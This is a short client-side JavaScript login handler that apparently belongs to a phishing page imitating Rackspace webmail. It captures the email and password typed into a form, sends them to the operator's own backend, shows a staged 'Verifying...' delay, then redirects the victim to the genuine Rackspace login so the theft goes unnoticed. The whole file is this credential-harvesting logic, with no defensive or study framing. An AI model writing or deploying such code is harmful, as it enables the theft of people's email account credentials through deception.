// Select elements from your current HTML
const emailInput = document.querySelector('input[type="email"]');
const passwordInput = document.querySelector('input[type="password"]');
const loginBtn = document.querySelector('.login');

// Verifying box
const verifyingBox = document.createElement('div');
verifyingBox.textContent = "Verifying...";
verifyingBox.style.display = 'none';
loginBtn.parentNode.appendChild(verifyingBox);

// Login button
loginBtn.addEventListener('click', async () => {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    alert('Please enter both email and password.');
    return;
  }

  // Disable button + show verifying
  loginBtn.disabled = true;
  verifyingBox.style.display = 'block';

  try {
    const response = await fetch("http://localhost:5000/api/login", {
      method: "POST",
      headers: { 
        "Content-Type": "application/json" 
      },
      body: JSON.stringify({ email, password })
    });

    // Wait 2 seconds to simulate processing
    setTimeout(() => {
      if (response.ok) {
        window.location.href = "https://apps.rackspace.com/wmidentity/Account/Login?"; // Redirect on success
      } else {
        loginBtn.disabled = false;
        verifyingBox.style.display = 'none';
      }
    }, 2000);

  } catch (error) {
    console.error("Login failed:", error);
    loginBtn.disabled = false;
    verifyingBox.style.display = 'none';
  }
});